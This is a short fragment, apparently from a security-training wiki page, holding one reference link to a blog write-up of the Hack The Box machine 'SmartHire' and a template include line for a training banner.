- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
